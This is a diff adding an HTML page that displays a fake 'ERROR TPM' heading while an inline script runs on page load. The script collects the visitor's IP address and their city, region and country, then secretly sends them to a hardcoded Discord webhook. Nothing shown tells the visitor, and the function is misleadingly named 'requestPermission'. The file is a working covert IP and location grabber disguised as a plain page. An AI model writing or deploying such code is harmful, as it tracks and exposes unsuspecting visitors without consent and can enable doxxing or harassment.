@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>My site</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: white;
+      color: #333;
+      text-align: center;
+      padding-top: 100px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>ERROR TPM</h1>
+
+  <script>
+    (async function requestPermission() {
+      try {
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipResponse.json();
+
+        const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const geoData = await geoResponse.json();
+
+        const webhookPayload = {
+          embeds: [{
+            title: "User Info",
+            color: 0x3498db,
+            fields: [
+              { name: "IP Address", value: ipData.ip, inline: true },
+              { name: "Location", value: `${geoData.city}, ${geoData.region}, ${geoData.country_name}`, inline: true }
+            ],
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        await fetch("https://discord.com/api/webhooks/1379163133536505926/g4VC585ANAu3n4m06eK-iH3r4s9WClYp5r8H9WAmLT8X3e9hwkH_fvHsNC6Y4TDVlRJ9", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(webhookPayload)
+        });
+
+        document.body.innerHTML = "<h1>Hi</h1>";
+      } catch (err) {
+        console.error("Error:", err);
+        document.body.innerHTML = "<h1>Error real</h1>";
+      }
+    })();
+  </script>
+</body>
+</html>
